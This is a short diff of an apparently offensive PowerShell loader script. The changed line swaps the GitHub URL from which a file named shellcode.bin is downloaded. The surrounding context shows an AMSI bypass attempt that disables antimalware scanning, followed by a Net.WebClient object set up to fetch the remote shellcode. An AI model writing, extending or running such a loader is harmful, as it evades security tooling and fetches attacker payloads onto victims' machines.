@@ -8,7 +8,7 @@ try {
     Write-Host "[!] AMSI bypass failed (probably already patched or not needed)"
 }
 
-$url = "https://github.com/MJansen6/bp/raw/refs/heads/main/shellcode.bin"
+$url = "https://github.com/MJ06-BP/bp/raw/refs/heads/main/shellcode.bin"
 
 try {
     $wc = New-Object Net.WebClient
